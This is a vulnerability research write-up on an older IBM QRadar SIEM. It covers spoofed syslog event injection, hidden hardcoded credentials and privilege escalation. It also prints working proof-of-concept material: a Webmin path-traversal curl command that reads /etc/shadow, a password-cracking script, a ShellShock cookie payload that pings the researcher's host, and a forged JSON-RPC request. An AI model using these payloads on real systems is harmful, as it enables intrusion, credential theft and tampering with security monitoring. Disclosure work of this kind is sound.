# Polarising Pine

## Abstract

This document and research was conducted after an interesting coincidence. A while back i was installing a new server and had requested a colleague of mine on how i might add this new server as a log source to our SIEM for monitoring. Expecting an agent or an elaborate set of instructions and key-exchange procedures i was surprised at learning that in order to be a log source on our SIEM, all you need to do is refer the syslog-ng service to the correct IP.

This was a great surprise to me as i had expected that in order to input data into what is one of the most sensitive apparatuses of our organization you would need some sort of identification and presumably, authorization. I was at least expecting some “Approve” button on the system alerting the existence of a new log source.

This prompted my curiosity. So after i validated that adding a log source does work in the way he mentioned, i went on to formulate some questions regarding that system to see what else i can understand regarding its operation. These will be the questions driving the research.

1. Does the SIEM automatically accept any device as a log source?
1. If there is no identification or authorization, how does the SIEM validate the authenticity of the data it receives and parses?
1. Can such a mechanism by circumvented?
    1. Is it feasible create new events from a new log source?
    1. Is it feasible to falsify new events from an existing log source (impersonation) ?
    1. Is it feasible to falsify previous logs from an existing log source (impersonation) ?
    1. Is it feasible to trigger alerting mechanism on events which had been injected into the system by falsifying data?
1. What security mechanism are in place on the OS level?
1. Which security mechanism are deployed on the interface level?
1. And mainly, is the SIEM system secure?

With these questions in mind a research was initiated into the SIEM system in an attempt to understand its operation and security mechanism.

It is critical to remember that these vulnerabilities have been tested on a relatively old version of the product. Most of the vulnerabilities described below are not applicable to the latest version.

## Methodology

### Events and Log Sources Research

As part of the research process, the key point would be to understand the mechanism in which the systems operate and make decisions. In this case i've started by understanding which protocols for a log source are supported, how the system registers them and what kind of analysis is being made on that raw data.

By default, the SIEM supports various types of log sources whilst the easiest one to setup and by far the most common one is syslog. We have started by understanding that the SIEM accepts connections for syslog on 514/udp and 5140/tcp. We have chosen to start understanding the UDP mechanism as it is easier to tamper with than the opponent, TCP. So the first start was to create a UDP listener on the SIEM to create a PCAP with some of that data.

```bash
tcpdump -i eth0 udp port 514 -c 1000 -w capture.cap
```

Since everything on the SIEM is running as `root` (a promising sign indeed) we did not need to add `sudo`. The `-i eth0` is meant to restrict the capturing only to the correct adapter while `udp port 514` will only listen on the designated port and `-c 1000` will capture up to 1000 packets, as this is a live SIEM getting hundreds of events per second.

When we have analyzed the packet capture we've seen something which can only be described as text-book-example syslog packets. No appended headers, trinkets or footers. The following text is a simple tab (‘\t') separated text which looks something like this:

```
Jan 1 11:11:11 192.168.1.1 AgentDevice=WindowsLog	AgentLogFile=Security	PluginVersion=1.0.14	Source=Microsoft-Windows-Security-Auditing	Computer=main_dc	User= 	Domain= 	EventID=4776	EventIDCode=4776	EventType=8	EventCategory=14336	RecordNumber=1089190650	TimeGenerated=111111111111	TimeWritten=111111111111	Message=The computer attempted to validate the credentials for an account.  Authentication Package: MICROSOFT_AUTHENTICATION_PACKAGE_V1_0 Logon Account: admin Source Workstation: main_dc Error Code: 0x0
```

Of course the names and IPs have been altered.
So the next step was to broadcast the same packet again and see if it is being accepted. This was done with a quick and dirty python script you can find as `reply_event.py`.

And lo and behold, a new event was created in the SIEM with those details. It took us some time to find it as we were looking for a new log source while that failed to appear. Apparently, the SIEM only writes that the event was reported by an IP but places the event as the log source of which the name appears in . As an example, this message was sent from an IP different to the one of the DC but the SIEM added the event under the DC because the host name in the raw data of the UDP packet pointed to it while logging in the details in the event that the event was reported by my IP.

Next step was to see what will happen if the same packet would be sent from the same IP as the one of the DC server itself. For that scapy became very handy as you can see in `scapy_send.py`.

And again, the SIEM had accepted this input as genuine but this time even the originating IP is the one of the DC. So in terms of looking even at the raw event data, the operator has no way of differentiating between this event and a real one.

**PoC I - Injecting False Events**

Next step was to buff it up to a level of a working code which is easy to modify and inject false events into the SIEM. So here you have `INJECT_EVENTS.py`. This is critical as `syslog` protocol is enabled by default so event if an organization is not working with `syslog` they will need to remember to disable it manually on the system.

### OS Research

In terms of OS research, even though root access to the machine was granted, a method of remote, as well as local research was chosen. To enable both what a hacker will see as well as getting full details of the system.
Nmap seemed like a good start remotely:

```
[root@machine /]# nmap -sV -O -A -p1-65000 192.168.1.1

Starting Nmap 5.51 ( http://nmap.org ) at 2017-06-30 09:29 AST
Nmap scan report for siem.local (192.168.1.1)
Host is up (0.000032s latency).
Not shown: 64960 closed ports
PORT      STATE SERVICE              VERSION
22/tcp    open  ssh                  OpenSSH 5.3 (protocol 2.0)
| ssh-hostkey: 1024 0a:[trimmed]:e4 (DSA)
|_2048 10:[trimmed]:e5 (RSA)
37/tcp    open  time?
111/tcp   open  rpcbind
443/tcp   open  ssl/http             Apache httpd
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
514/tcp   open  shell?
1514/tcp  open  unknown
4333/tcp  open  http                 Apache httpd
|_http-title: Blocked
|_http-favicon:
5432/tcp  open  postgresql           PostgreSQL DB
7676/tcp  open  java-message-service Java Message Service 4.4 Update 1
7677/tcp  open  unknown
7777/tcp  open  cbt?
7778/tcp  open  interwise?
7779/tcp  open  unknown
7780/tcp  open  unknown
7781/tcp  open  unknown
7782/tcp  open  unknown
7790/tcp  open  unknown
7791/tcp  open  unknown
7793/tcp  open  unknown
7799/tcp  open  unknown
7800/tcp  open  asr?
7801/tcp  open  unknown
7803/tcp  open  unknown
8009/tcp  open  ajp13                Apache Jserv (Protocol v1.3)
8080/tcp  open  http                 Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat
|_http-favicon: Apache Tomcat
| http-methods: Potentially risky methods: PUT DELETE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_http-open-proxy: Proxy might be redirecting requests
10000/tcp open  http                 MiniServ 0.01 (Webmin httpd)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
15433/tcp open  postgresql           PostgreSQL DB
23333/tcp open  unknown
32005/tcp open  unknown
32009/tcp open  unknown
32010/tcp open  unknown
32011/tcp open  unknown
34570/tcp open  unknown
34571/tcp open  unknown
34572/tcp open  http                 Adaptec Storage Manager Agent httpd
|_http-methods: No Allow or Public header in OPTIONS response (status code 501)
|_http-title: %APPLICATION%
34573/tcp open  ssl/unknown
50915/tcp open  unknown
50978/tcp open  unknown
54165/tcp open  unknown
57290/tcp open  unknown
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port37-TCP:V=5.51%I=7%D=6/30%Time=5955EFB3%P=x86_64-redhat-linux-gnu%r(
SF:NULL,4,"\xdd\0n3");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5432-TCP:V=5.51%I=[...trimmed...];
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port15433-TCP:V=5.51%I=[...trimmed...];
No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=5.51%D=6/30%OT=[...trimmed...])
```

As you can see, it's not that the attack surface was comprehensive but rather overwhelming. With expectations to find some services we can play around with, we have found almost all of them in an overwhelming abundance.

First one that jumped to the start of the list was port 10000/tcp registered as ‘webmin'. A quick search gives us several vulnerabilities. We have attempted one straight off the page and found it to fail. Reason: SSL Handshake Failed. After some tests we found that the service uses an SSL version which is just not supported. Tweaking the `curl` command line a bit got us:

**PoC II - Remote File Inclusion with root Access**

```
curl --sslv3 -k -v -d  https://192.168.1.1:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd
```

Which surprised us by simply coughing up `/etc/passwd`. So we went a step bolder and requested, kindly of course, for the `/etc/shadow` file. The service was kind enough to oblige.
At this point we've decided to look into the patching levels of the machine as the kernel seemed ‘a bit' outdated. We have listed in our notes that the system is vulnerable to ShellShock. We shall address that on the Web Admin Interface Research.

#### Hardcoded Credentials with weak Storage

So we figured out that the several files holding the username `configservices` which were interesting for us:
```
/opt/qradar/conf/templates/users.conf
/opt/qradar/conf/templates/configservices_users.conf
/opt/qradar/conf/users.conf
/opt/qradar/conf/configservices_users.conf
```

The file `/opt/qradar/conf/configservices_users.conf` holds credentials stored with `crypt`. So we've wrote a little script to 'bruteforce' and check the passwords with some of the several most common dictionaries.

```python
import crypt

def login(pass2check, digest):
    username = "admin"
    cleartext = pass2check
    cryptedpasswd = digest
    return crypt.crypt(cleartext, cryptedpasswd) == cryptedpasswd

passwords = ["AGuocsnOEaHlw", "/wEPae8TzCqmM"]
words = open('10_million_password_list_top_1000000.txt', 'r').readlines()
words = open('darkc0de.lst', 'r').readlines()
words = open('rockyou.txt', 'r').readlines()


for password in passwords:
    for word in words:
        if login(word.strip(), password):
            print word.strip(),":", password
```

Biggest issue for us that the user `admin` holds the password `initial`.


### Web Admin Interface Research

#### Hardcoded root User

When you thought things cannot really get worse…
Exclaiming to my friend that the web interface is usually guarded and amongst those, the authentication features are heavily scrutinised so finding anything in there would be highly unlikely, i could not have been more wrong.
A simple ‘View Source' of the login page returned this:

```html
<script>
[...]

function submitForm()
{
	if ( document.forms[0].j_username.value.toLowerCase() == "configservices" )
		return false;
	else
		document.forms[0].submit();
}

[...]
</script>
```

At this point i seriously started pondering the existence of a honeypot. So having a look at the configuration file for the users on the SIEM at `/opt/qradar/conf/users.conf` and `/opt/qradar/conf/configservices_users.conf`, which can be acquired by the previous issue we found the user.  This removed the fear for a honeypot as no one in thier right mind will create a honeypot user with a password. Some password cracking for the hash there yielded that the plain text of the ‘military grade encryption' was set to `HIDDEN`. Commenting out the JavaScript "blockings" in the Web UI we logged in just fine. This user is an Administrative user on the UI and is hidden from other operators or Administrators.

**The password is not really HIDDEN but since we deem this as extremly dangerous as the user is hardcoded and does not appear in any Admin UI and there seems to be no way of changing it except for in that particular file we have chosen for now to omit the actual password.**

#### Exploit Reuse - ShellShock

Reaching far back to the past to when we discovered the vulnerability of the system to ShellShock we were determined to check whether this can really be exploited remotely or "just" a locally exploitable vulnerability.

**PoC III - ShellShock Code Execution**

```
POST /console/config/config.cgi HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://192.168.1.1/console/do/qradar/rightadminconsole?appName=qradar&pageId=allTabs
Cookie: JSESSIONID=60[trimmed1BF; SEC=3e[trimmed1a6; () { :;}; echo COKKIE=SHELLY ; echo ; ping -c 5 MY_IP
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 101

configarea=remoteservices&viewconf=staging%2Fglobalconfig&stoken=89[trimmed]18
```

And another ‘lo and behold' as Wireshark registers pings coming into my system from the SIEM! Just a reminder: all services under the SIEM are running at ‘root'. It is important to notice that in the new system which we have checked 'ShellShock' had been patched and this does not exist.

#### Privilege Escalation

Next step was to see if users' privileges are being regulated properly. Another user was created as an ordinary user which should be restricted. An attempt to alter other users' privileges or details failed. The SIEM had verified the privileges of the user and blocked the attempt. However, there was another form at the top of the toolbar to edit the user that was created. That form did not go through the entire ordeal of verifying the user's privileges as it was only supposed to change the user which it was on. The issue is that the system did not verify that by the cookies and authentication that was done but rather through the details in the form itself.

**PoC IV - Privilege Escalation via Authenticated User**

```json
POST /console/JSON-RPC/QRadar.saveUserPreferences HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://192.168.1.1/console/qradar/jsp/QRadar.jsp
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 391
Cookie: JSESSIONID=72[trimmed]EC; SEC=32[trimmed]94
Connection: close

{method:"QRadar.saveUserPreferences",params:{"userJSON":{"id":"1","username":"admin","email":"my_personal_email@morirt.com","description":"","password":"123546","passwordConfirm":"123456","roleId":null,"spId":null,"validationErrors":{},"roleName":"","securityProfileName":"","locale":"en","timezone":null,"DISPLAY_NOTIFICATION_POPUPS":true}},sessionId:"32[trimmed]94",id:"875"}
```

And the answer was 'why not...'.

```json
HTTP/1.1 200 OK
Date: Wed, 28 Jun 2017 09:16:07 GMT
Pragma: no-cache
Cache-Control: must-revalidate
Cache-Control: no-cache
Cache-Control: no-store
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Content-Type: UTF-8;charset=UTF-8
Connection: close
Content-Length: 124

{"id":"875","result":{"message":null,"id":null,"success":true,"validationErrors":null,"serializedObject":null},"error":null}

```

#### Default Page

This page discloses the use of apache on a Red Hat at `https://ip/.noindex.html`.


## Summary

Generally speaking, a SIEM is a good idea and a must-have for every competent security team or every organization who takes their security seriously. IBM is a leading provider for such a tool with a lot of functionality and capabilities. How ever, there are lessons to be learned from purchasing a company and building up on their product. Although we have seem major and significant improvements in term of security of the latest versions there is still a lot to be done.
